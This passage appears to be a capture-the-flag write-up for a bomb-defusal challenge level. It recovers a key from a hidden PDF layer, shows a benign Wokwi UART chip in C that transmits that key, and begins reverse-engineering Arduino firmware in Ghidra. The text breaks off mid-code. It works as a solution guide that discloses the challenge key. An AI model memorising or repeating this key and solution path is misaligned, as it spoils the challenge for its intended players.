<p>Interestingly, at the bottom of the schematic, it shows "page 1 / 2", but only one page was visible in the PDF. This suggests the presence of a hidden layer. Using an online PDF viewer like <a href="https://www.dochub.com/en/functionalities/manage-pdf-layers-on-pc">DocHub</a>, I was able to uncover the hidden layer, which revealed a key: <code>m59F$6/lHI^wR~C6</code>.</p>
<p><img alt="" src="../assets/level-10-schematics-hidden-pdf.png" /></p>
<p>Not knowing what the key was for, I moved on. While searching for the various components of the bomb on Google, I came across a <a href="https://wokwi.com/projects/409614629412546561">link</a> to a Wokwi project. In this project, the components were linked up exactly like the schematics. The key from the hidden PDF layer also matched the key in this project. It appears the key resides in the <code>uart-key-chip</code> custom component, and will be transmitted to the Arduino firmware.</p>
<p><img alt="" src="../assets/level-10-wokwi-project.png" /></p>
<p>Here is the custom chip source, which appears to leverage <a href="https://docs.wokwi.com/chips-api/uart">Wokwi's UART API</a>:</p>
<div class="language-c highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">C</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-4-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-4-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-4-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-4-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-4-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-4-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-4-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-4-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-4-10">10</a></span>
<span class="normal"><a href="#__codelineno-4-11">11</a></span>
<span class="normal"><a href="#__codelineno-4-12">12</a></span>
<span class="normal"><a href="#__codelineno-4-13">13</a></span>
<span class="normal"><a href="#__codelineno-4-14">14</a></span>
<span class="normal"><a href="#__codelineno-4-15">15</a></span>
<span class="normal"><a href="#__codelineno-4-16">16</a></span>
<span class="normal"><a href="#__codelineno-4-17">17</a></span>
<span class="normal"><a href="#__codelineno-4-18">18</a></span>
<span class="normal"><a href="#__codelineno-4-19">19</a></span>
<span class="normal"><a href="#__codelineno-4-20">20</a></span>
<span class="normal"><a href="#__codelineno-4-21">21</a></span>
<span class="normal"><a href="#__codelineno-4-22">22</a></span>
<span class="normal"><a href="#__codelineno-4-23">23</a></span>
<span class="normal"><a href="#__codelineno-4-24">24</a></span>
<span class="normal"><a href="#__codelineno-4-25">25</a></span>
<span class="normal"><a href="#__codelineno-4-26">26</a></span>
<span class="normal"><a href="#__codelineno-4-27">27</a></span>
<span class="normal"><a href="#__codelineno-4-28">28</a></span>
<span class="normal"><a href="#__codelineno-4-29">29</a></span>
<span class="normal"><a href="#__codelineno-4-30">30</a></span>
<span class="normal"><a href="#__codelineno-4-31">31</a></span>
<span class="normal"><a href="#__codelineno-4-32">32</a></span>
<span class="normal"><a href="#__codelineno-4-33">33</a></span>
<span class="normal"><a href="#__codelineno-4-34">34</a></span>
<span class="normal"><a href="#__codelineno-4-35">35</a></span>
<span class="normal"><a href="#__codelineno-4-36">36</a></span>
<span class="normal"><a href="#__codelineno-4-37">37</a></span>
<span class="normal"><a href="#__codelineno-4-38">38</a></span>
<span class="normal"><a href="#__codelineno-4-39">39</a></span>
<span class="normal"><a href="#__codelineno-4-40">40</a></span>
<span class="normal"><a href="#__codelineno-4-41">41</a></span>
<span class="normal"><a href="#__codelineno-4-42">42</a></span>
<span class="normal"><a href="#__codelineno-4-43">43</a></span>
<span class="normal"><a href="#__codelineno-4-44">44</a></span>
<span class="normal"><a href="#__codelineno-4-45">45</a></span>
<span class="normal"><a href="#__codelineno-4-46">46</a></span>
<span class="normal"><a href="#__codelineno-4-47">47</a></span>
<span class="normal"><a href="#__codelineno-4-48">48</a></span>
<span class="normal"><a href="#__codelineno-4-49">49</a></span>
<span class="normal"><a href="#__codelineno-4-50">50</a></span>
<span class="normal"><a href="#__codelineno-4-51">51</a></span>
<span class="normal"><a href="#__codelineno-4-52">52</a></span>
<span class="normal"><a href="#__codelineno-4-53">53</a></span>
<span class="normal"><a href="#__codelineno-4-54">54</a></span>
<span class="normal"><a href="#__codelineno-4-55">55</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1"></a><span class="c1">// Wokwi Custom UART Chip Example</span>
</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2"></a><span class="c1">//</span>
</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3"></a><span class="c1">// This chip implements a simple ROT13 letter substitution cipher.</span>
</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4"></a><span class="c1">// It receives a string over UART, and returns the same string with</span>
</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5"></a><span class="c1">// each alphabetic character replaced with its ROT13 substitution.</span>
</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6"></a><span class="c1">//</span>
</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7"></a><span class="c1">// For information and examples see:</span>
</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8"></a><span class="c1">// https://link.wokwi.com/custom-chips-alpha</span>
</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9"></a><span class="c1">//</span>
</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10"></a><span class="c1">// SPDX-License-Identifier: MIT</span>
</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11"></a><span class="c1">// Copyright (C) 2022 Uri Shaked / wokwi.com</span>
</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12"></a>
</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&quot;wokwi-api.h&quot;</span>
</span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
</span><span id="__span-4-15"><a id="__codelineno-4-15" name="__codelineno-4-15"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
</span><span id="__span-4-16"><a id="__codelineno-4-16" name="__codelineno-4-16"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>
</span><span id="__span-4-17"><a id="__codelineno-4-17" name="__codelineno-4-17"></a>
</span><span id="__span-4-18"><a id="__codelineno-4-18" name="__codelineno-4-18"></a><span class="k">typedef</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-4-19"><a id="__codelineno-4-19" name="__codelineno-4-19"></a><span class="w">  </span><span class="n">uart_dev_t</span><span class="w"> </span><span class="n">uart0</span><span class="p">;</span>
</span><span id="__span-4-20"><a id="__codelineno-4-20" name="__codelineno-4-20"></a><span class="p">}</span><span class="w"> </span><span class="n">chip_state_t</span><span class="p">;</span>
</span><span id="__span-4-21"><a id="__codelineno-4-21" name="__codelineno-4-21"></a>
</span><span id="__span-4-22"><a id="__codelineno-4-22" name="__codelineno-4-22"></a><span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">on_uart_rx_data</span><span class="p">(</span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">user_data</span><span class="p">,</span><span class="w"> </span><span class="kt">uint8_t</span><span class="w"> </span><span class="n">byte</span><span class="p">);</span>
</span><span id="__span-4-23"><a id="__codelineno-4-23" name="__codelineno-4-23"></a><span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">on_uart_write_done</span><span class="p">(</span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">user_data</span><span class="p">);</span>
</span><span id="__span-4-24"><a id="__codelineno-4-24" name="__codelineno-4-24"></a>
</span><span id="__span-4-25"><a id="__codelineno-4-25" name="__codelineno-4-25"></a><span class="kt">void</span><span class="w"> </span><span class="nf">chip_init</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-4-26"><a id="__codelineno-4-26" name="__codelineno-4-26"></a><span class="w">  </span><span class="n">chip_state_t</span><span class="w"> </span><span class="o">*</span><span class="n">chip</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">chip_state_t</span><span class="p">));</span>
</span><span id="__span-4-27"><a id="__codelineno-4-27" name="__codelineno-4-27"></a>
</span><span id="__span-4-28"><a id="__codelineno-4-28" name="__codelineno-4-28"></a><span class="w">  </span><span class="k">const</span><span class="w"> </span><span class="n">uart_config_t</span><span class="w"> </span><span class="n">uart_config</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-4-29"><a id="__codelineno-4-29" name="__codelineno-4-29"></a><span class="w">    </span><span class="p">.</span><span class="n">tx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pin_init</span><span class="p">(</span><span class="s">&quot;TX&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">INPUT_PULLUP</span><span class="p">),</span>
</span><span id="__span-4-30"><a id="__codelineno-4-30" name="__codelineno-4-30"></a><span class="w">    </span><span class="p">.</span><span class="n">rx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pin_init</span><span class="p">(</span><span class="s">&quot;RX&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">INPUT</span><span class="p">),</span>
</span><span id="__span-4-31"><a id="__codelineno-4-31" name="__codelineno-4-31"></a><span class="w">    </span><span class="p">.</span><span class="n">baud_rate</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">9600</span><span class="p">,</span>
</span><span id="__span-4-32"><a id="__codelineno-4-32" name="__codelineno-4-32"></a><span class="w">    </span><span class="p">.</span><span class="n">rx_data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">on_uart_rx_data</span><span class="p">,</span>
</span><span id="__span-4-33"><a id="__codelineno-4-33" name="__codelineno-4-33"></a><span class="w">    </span><span class="p">.</span><span class="n">write_done</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">on_uart_write_done</span><span class="p">,</span>
</span><span id="__span-4-34"><a id="__codelineno-4-34" name="__codelineno-4-34"></a><span class="w">    </span><span class="p">.</span><span class="n">user_data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">chip</span><span class="p">,</span>
</span><span id="__span-4-35"><a id="__codelineno-4-35" name="__codelineno-4-35"></a><span class="w">  </span><span class="p">};</span>
</span><span id="__span-4-36"><a id="__codelineno-4-36" name="__codelineno-4-36"></a><span class="w">  </span><span class="n">chip</span><span class="o">-&gt;</span><span class="n">uart0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">uart_init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">uart_config</span><span class="p">);</span>
</span><span id="__span-4-37"><a id="__codelineno-4-37" name="__codelineno-4-37"></a>
</span><span id="__span-4-38"><a id="__codelineno-4-38" name="__codelineno-4-38"></a><span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;UART Chip initialized!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span id="__span-4-39"><a id="__codelineno-4-39" name="__codelineno-4-39"></a><span class="p">}</span>
</span><span id="__span-4-40"><a id="__codelineno-4-40" name="__codelineno-4-40"></a>
</span><span id="__span-4-41"><a id="__codelineno-4-41" name="__codelineno-4-41"></a><span class="kt">char</span><span class="w"> </span><span class="n">key</span><span class="p">[</span><span class="mi">17</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;m59F$6/lHI^wR~C6&quot;</span><span class="p">;</span>
</span><span id="__span-4-42"><a id="__codelineno-4-42" name="__codelineno-4-42"></a><span class="kt">size_t</span><span class="w"> </span><span class="n">idx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
</span><span id="__span-4-43"><a id="__codelineno-4-43" name="__codelineno-4-43"></a>
</span><span id="__span-4-44"><a id="__codelineno-4-44" name="__codelineno-4-44"></a><span class="w"> </span><span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">on_uart_rx_data</span><span class="p">(</span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">user_data</span><span class="p">,</span><span class="w"> </span><span class="kt">uint8_t</span><span class="w"> </span><span class="n">byte</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-4-45"><a id="__codelineno-4-45" name="__codelineno-4-45"></a><span class="w">  </span><span class="n">chip_state_t</span><span class="w"> </span><span class="o">*</span><span class="n">chip</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">chip_state_t</span><span class="o">*</span><span class="p">)</span><span class="n">user_data</span><span class="p">;</span>
</span><span id="__span-4-46"><a id="__codelineno-4-46" name="__codelineno-4-46"></a><span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">out</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">key</span><span class="p">[</span><span class="n">idx</span><span class="o">++</span><span class="p">];</span>
</span><span id="__span-4-47"><a id="__codelineno-4-47" name="__codelineno-4-47"></a><span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Incoming UART data: %c</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">byte</span><span class="p">);</span>
</span><span id="__span-4-48"><a id="__codelineno-4-48" name="__codelineno-4-48"></a><span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Outgoing UART data: %c</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">out</span><span class="p">);</span>
</span><span id="__span-4-49"><a id="__codelineno-4-49" name="__codelineno-4-49"></a><span class="w">  </span><span class="n">uart_write</span><span class="p">(</span><span class="n">chip</span><span class="o">-&gt;</span><span class="n">uart0</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">uint8_t</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">out</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">out</span><span class="p">));</span>
</span><span id="__span-4-50"><a id="__codelineno-4-50" name="__codelineno-4-50"></a><span class="p">}</span>
</span><span id="__span-4-51"><a id="__codelineno-4-51" name="__codelineno-4-51"></a>
</span><span id="__span-4-52"><a id="__codelineno-4-52" name="__codelineno-4-52"></a><span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">on_uart_write_done</span><span class="p">(</span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">user_data</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-4-53"><a id="__codelineno-4-53" name="__codelineno-4-53"></a><span class="w">  </span><span class="n">chip_state_t</span><span class="w"> </span><span class="o">*</span><span class="n">chip</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">chip_state_t</span><span class="o">*</span><span class="p">)</span><span class="n">user_data</span><span class="p">;</span>
</span><span id="__span-4-54"><a id="__codelineno-4-54" name="__codelineno-4-54"></a><span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;UART done</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span id="__span-4-55"><a id="__codelineno-4-55" name="__codelineno-4-55"></a><span class="p">}</span>
</span></code></pre></div></td></tr></table></div>
<p>By uploading the firmware (using the shortcut key F1 -&gt; <code>Upload Firmware and Start Simulation...</code>) to the Wokwi project, the bomb starts. From the Wokwi logs, we see that the chip gets initialized and data is transmitted in (<code>F8g3a_9V7G2$d#0h</code>) and out (<code>m59F$6/lHI^wR~C6</code>) of the chip.</p>
<p><img alt="" src="../assets/level-10-wokwi-logs.png" /></p>
<p>From the schematics, we can infer that the Intel HEX file found earlier likely contains the firmware for the Arduino used in this project. A quick search also revealed that the <code>Arduino UNO Rev 2</code> uses the <code>ATmega4809</code> microcontroller, which is part of the <code>AVR8</code> family. Unfortunately, both Ghidra and IDA do not have configurations to handle this specific processor variant, which presents a significant challenge in analyzing the firmware directly using these tools.</p>
<h2 id="firmware-analysis">Firmware Analysis</h2>
<p>To ensure the file can be properly parsed by disassemblers, the Intel HEX file was converted into a binary format:</p>
<div class="language-sh highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-5-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1"></a>avr-objcopy<span class="w"> </span>-I<span class="w"> </span>ihex<span class="w"> </span>firmware.hex<span class="w"> </span>-O<span class="w"> </span>binary<span class="w"> </span>firmware.bin
</span></code></pre></div></td></tr></table></div>
<p>Ghidra doesn't seem to have the processor specification configuration to properly parse the firmware. I tried reading the processor manual and writing my own specs for the <code>ATmega4809</code> (used by Arduino UNO Rev 2), but it did not work out. Instead, I can only make do with the existing configurations and interpret the results cautiously.</p>
<p>The article <a href="https://www.jonaslieb.de/blog/arduino-ghidra-intro/">https://www.jonaslieb.de/blog/arduino-ghidra-intro/</a> provides useful guidance on analyzing the entry point of the firmware (<code>Reset</code>) and more. From this article, it helps with identifying where the <code>main()</code> function is located.</p>
<p>Here is the <code>Reset</code> logic:</p>
<div class="language-c highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">C</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-6-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-6-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-6-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-6-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-6-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-6-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-6-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-6-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-6-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-6-10">10</a></span>
<span class="normal"><a href="#__codelineno-6-11">11</a></span>
<span class="normal"><a href="#__codelineno-6-12">12</a></span>
<span class="normal"><a href="#__codelineno-6-13">13</a></span>
<span class="normal"><a href="#__codelineno-6-14">14</a></span>
<span class="normal"><a href="#__codelineno-6-15">15</a></span>
<span class="normal"><a href="#__codelineno-6-16">16</a></span>
<span class="normal"><a href="#__codelineno-6-17">17</a></span>
<span class="normal"><a href="#__codelineno-6-18">18</a></span>
<span class="normal"><a href="#__codelineno-6-19">19</a></span>
<span class="normal"><a href="#__codelineno-6-20">20</a></span>
<span class="normal"><a href="#__codelineno-6-21">21</a></span>
<span class="normal"><a href="#__codelineno-6-22">22</a></span>
<span class="normal"><a href="#__codelineno-6-23">23</a></span>
<span class="normal"><a href="#__codelineno-6-24">24</a></span>
<span class="normal"><a href="#__codelineno-6-25">25</a></span>
<span class="normal"><a href="#__codelineno-6-26">26</a></span>
<span class="normal"><a href="#__codelineno-6-27">27</a></span>
<span class="normal"><a href="#__codelineno-6-28">28</a></span>
<span class="normal"><a href="#__codelineno-6-29">29</a></span>
<span class="normal"><a href="#__codelineno-6-30">30</a></span>
<span class="normal"><a href="#__codelineno-6-31">31</a></span>
<span class="normal"><a href="#__codelineno-6-32">32</a></span>
<span class="normal"><a href="#__codelineno-6-33">33</a></span>
<span class="normal"><a href="#__codelineno-6-34">34</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1"></a><span class="kt">void</span><span class="w"> </span><span class="nf">Reset</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2"></a><span class="p">{</span>
</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3"></a><span class="w">  </span><span class="n">undefined1</span><span class="w"> </span><span class="o">*</span><span class="n">puVar1</span><span class="p">;</span>
</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4"></a>
</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5"></a><span class="w">  </span><span class="n">R1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6"></a><span class="w">  </span><span class="n">SREG</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7"></a><span class="w">  </span><span class="n">R17</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sc">&#39;\x02&#39;</span><span class="p">;</span>
</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8"></a><span class="w">  </span><span class="n">X</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">DAT_mem_0100</span><span class="p">;</span>
</span><span id="__span-6-9"><a id="__codelineno-6-9" name="__codelineno-6-9"></a><span class="w">  </span><span class="n">Z</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">DAT_codebyte_30be</span><span class="p">;</span>
</span><span id="__span-6-10"><a id="__codelineno-6-10" name="__codelineno-6-10"></a><span class="w">  </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="n">puVar1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">X</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">byte</span><span class="p">)</span><span class="n">X</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mh">0x80</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">X</span><span class="p">.</span><span class="n">_1_1_</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="p">)(</span><span class="n">R17</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">((</span><span class="n">byte</span><span class="p">)</span><span class="n">X</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mh">0x80</span><span class="p">)))</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-6-11"><a id="__codelineno-6-11" name="__codelineno-6-11"></a><span class="w">    </span><span class="n">R0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">*</span><span class="n">Z</span><span class="p">;</span>
</span><span id="__span-6-12"><a id="__codelineno-6-12" name="__codelineno-6-12"></a><span class="w">    </span><span class="n">Z</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Z</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
</span><span id="__span-6-13"><a id="__codelineno-6-13" name="__codelineno-6-13"></a><span class="w">    </span><span class="n">X</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">X</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
</span><span id="__span-6-14"><a id="__codelineno-6-14" name="__codelineno-6-14"></a><span class="w">    </span><span class="o">*</span><span class="n">puVar1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">R0</span><span class="p">;</span>
</span><span id="__span-6-15"><a id="__codelineno-6-15" name="__codelineno-6-15"></a><span class="w">  </span><span class="p">}</span>
</span><span id="__span-6-16"><a id="__codelineno-6-16" name="__codelineno-6-16"></a><span class="w">  </span><span class="n">R18</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sc">&#39;\x05&#39;</span><span class="p">;</span>
</span><span id="__span-6-17"><a id="__codelineno-6-17" name="__codelineno-6-17"></a><span class="w">  </span><span class="n">X</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">DAT_mem_0280</span><span class="p">;</span>
</span><span id="__span-6-18"><a id="__codelineno-6-18" name="__codelineno-6-18"></a><span class="w">  </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="n">puVar1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">X</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">byte</span><span class="p">)</span><span class="n">X</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mh">0x93</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">X</span><span class="p">.</span><span class="n">_1_1_</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="p">)(</span><span class="n">R18</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">((</span><span class="n">byte</span><span class="p">)</span><span class="n">X</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mh">0x93</span><span class="p">)))</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-6-19"><a id="__codelineno-6-19" name="__codelineno-6-19"></a><span class="w">    </span><span class="n">X</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">X</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
</span><span id="__span-6-20"><a id="__codelineno-6-20" name="__codelineno-6-20"></a><span class="w">    </span><span class="o">*</span><span class="n">puVar1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">R1</span><span class="p">;</span>
</span><span id="__span-6-21"><a id="__codelineno-6-21" name="__codelineno-6-21"></a><span class="w">  </span><span class="p">}</span>
</span><span id="__span-6-22"><a id="__codelineno-6-22" name="__codelineno-6-22"></a><span class="w">  </span><span class="n">R17</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
</span><span id="__span-6-23"><a id="__codelineno-6-23" name="__codelineno-6-23"></a><span class="w">  </span><span class="n">Y</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">undefined1</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="mh">0x162</span><span class="p">;</span>
</span><span id="__span-6-24"><a id="__codelineno-6-24" name="__codelineno-6-24"></a><span class="w">  </span><span class="k">while</span><span class="w"> </span><span class="p">((</span><span class="n">byte</span><span class="p">)</span><span class="n">Y</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mh">0x61</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">Y</span><span class="p">.</span><span class="n">_1_1_</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="p">)(((</span><span class="n">byte</span><span class="p">)</span><span class="n">Y</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mh">0x61</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="sc">&#39;\x01&#39;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-6-25"><a id="__codelineno-6-25" name="__codelineno-6-25"></a><span class="w">    </span><span class="n">Y</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Y</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span>
</span><span id="__span-6-26"><a id="__codelineno-6-26" name="__codelineno-6-26"></a><span class="w">    </span><span class="n">Z</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Y</span><span class="p">;</span>
</span><span id="__span-6-27"><a id="__codelineno-6-27" name="__codelineno-6-27"></a><span class="w">    </span><span class="n">DAT_mem_08fe</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x184</span><span class="p">;</span>
</span><span id="__span-6-28"><a id="__codelineno-6-28" name="__codelineno-6-28"></a><span class="w">    </span><span class="n">FUN_code_1637</span><span class="p">();</span>
</span><span id="__span-6-29"><a id="__codelineno-6-29" name="__codelineno-6-29"></a><span class="w">  </span><span class="p">}</span>
</span><span id="__span-6-30"><a id="__codelineno-6-30" name="__codelineno-6-30"></a><span class="w">  </span><span class="n">DAT_mem_08fe</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x189</span><span class="p">;</span>
</span><span id="__span-6-31"><a id="__codelineno-6-31" name="__codelineno-6-31"></a><span class="w">  </span><span class="n">FUN_code_0c45</span><span class="p">();</span>
</span><span id="__span-6-32"><a id="__codelineno-6-32" name="__codelineno-6-32"></a><span class="w">  </span><span class="n">FUN_code_1852</span><span class="p">();</span>
</span><span id="__span-6-33"><a id="__codelineno-6-33" name="__codelineno-6-33"></a><span class="w">  </span><span class="k">return</span><span class="p">;</span>
</span><span id="__span-6-34"><a id="__codelineno-6-34" name="__codelineno-6-34"></a><span class="p">}</span>
</span></code></pre></div></td></tr></table></div>
<p><code>FUN_code_0c45()</code> likely corresponds to <code>main()</code>, and <code>FUN_code_1852()</code> corresponds to GCC's <code>exit()</code>. Therefore, we can start renaming these functions accordingly.</p>
<p>The following code block should maps to <code>__do_copy_data()</code> which is the function responsible for loading a <code>.data</code> section from ROM:</p>
<div class="language-c highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">C</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-7-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-7-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-7-3"> 3</a></span>
